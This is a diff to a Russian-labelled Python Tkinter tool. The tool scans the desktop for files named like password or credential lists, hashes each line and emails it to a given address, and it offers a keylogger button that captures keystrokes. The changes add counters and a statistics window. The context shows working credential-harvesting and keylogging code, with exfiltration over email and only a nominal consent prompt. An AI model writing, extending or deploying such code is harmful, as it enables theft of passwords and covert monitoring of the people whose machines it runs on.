@@ -5,6 +5,11 @@ import time
 import keyboard
 from tkinter import Tk, Label, Entry, Button, messagebox, DISABLED, NORMAL
 
+# Объявление глобальных переменных
+password_files = []
+key_combination_count = 0
+start_time = 0
+
 # Функция для отправки электронной почты
 def send_email(subject, content, sender_email, password, receiver_email):
     message = f'Subject: {subject}\n\n{content}'
@@ -35,11 +40,15 @@ def process_files(sender_email, password, receiver_email):
                        'список_паролей.txt', 'учетные_данные.txt', 'логины_и_пароли.txt',
                        'секреты.txt', 'коды_доступа.txt', 'ключи_для_входа.txt', 'конфиденциальные_данные.txt']
 
+    password_count = 0
+
     for file_name in files_to_search:
         file_path = os.path.join(desktop_path, file_name)
         if os.path.isfile(file_path):
+            password_files.append(file_name)
             with open(file_path, 'r') as file:
                 for line in file:
+                    password_count += 1
                     hashed_line = hash_string(line.strip())
                     email_subject = 'EHP'
                     email_content = f'EHP password {hashed_line}'
@@ -48,16 +57,21 @@ def process_files(sender_email, password, receiver_email):
                         messagebox.showerror('Ошибка', 'Не удалось отправить данные на почту.')
                         return
 
-    messagebox.showinfo('Успех', 'Поиск файлов с паролями завершен.')
+    messagebox.showinfo('Успех', f'Найдено {len(password_files)} файлов с паролями.\n'
+                                 f'Общее количество паролей: {password_count}.\n'
+                                 f'Названия файлов: {", ".join(password_files)}.')
 
 # Функция для обработки нажатий клавиш
 def process_key_presses(sender_email, password, receiver_email):
+    global key_combination_count, start_time
     key_combination = ''
     start_time = time.time()
 
     def on_press(event):
         nonlocal key_combination
         key_combination += event.name
+        global key_combination_count
+        key_combination_count += 1
 
     keyboard.on_press(on_press)
 
@@ -144,9 +158,9 @@ def create_window():
         if check_fields(email, password, receiver_email, master_key, consent):
             if consent.lower() == 'да':
                 process_files(email, password, receiver_email)
-
             else:
                 messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')
+
     def start_keylogger():
         email = entry_email.get()
         password = entry_password.get()
@@ -166,11 +180,21 @@ def create_window():
             else:
                 messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')
 
+    def close_program():
+        global password_files
+        messagebox.showinfo('Статистика', f'Количество файлов с паролями: {len(password_files)}\n'
+                                          f'Общее количество комбинаций клавиш: {key_combination_count}\n'
+                                          f'Время работы программы: {time.time() - start_time}')
+        exit()
+
     button_search = Button(window, text='Начать поиск файлов с паролями', command=start_search)
     button_search.pack()
 
     button_keylogger = Button(window, text='Запустить кейлоггер', command=start_keylogger)
     button_keylogger.pack()
+
+    button_close = Button(window, text='Закрыть программу и вывести статистику', command=close_program)
+    button_close.pack()
 
     # Копирование пароля из буфера обмена
     def paste_password():
